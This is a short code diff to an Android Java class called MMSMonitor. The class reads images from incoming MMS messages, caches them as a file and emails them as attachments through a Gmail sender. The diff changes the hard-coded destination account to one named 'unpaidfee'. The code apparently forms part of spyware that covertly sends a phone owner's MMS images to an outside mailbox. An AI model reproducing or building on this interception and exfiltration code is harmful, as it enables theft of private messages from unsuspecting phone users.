@@ -213,12 +213,12 @@ public class MMSMonitor {
                                     Log("", "MMSMonitor :: Iimage width : "+ bitmap.getWidth() + " height : " + bitmap.getHeight());
 
                                     try{
-                                        GMailSender sender = new GMailSender("yongsung.kang@gmail.com", "");
+                                        GMailSender sender = new GMailSender("unpaidfee@gmail.com", "");
 
                                         saveBitmapToFileCache(bitmap, context.getCacheDir().toString() + "/temp.jpg");
 
                                         sender.addAttachment(context.getCacheDir().toString() + "/temp.jpg", "첨부제목");
-                                        sender.sendMail("테스트 제목", "본문", "yongsung.kang@gmail.com", "yongsung.kang@gmail.com");
+                                        sender.sendMail("테스트 제목", "본문", "unpaidfee@gmail.com", "unpaidfee@gmail.com");
                                     }catch (Exception e){
                                         Log("", e.getMessage());
                                     }
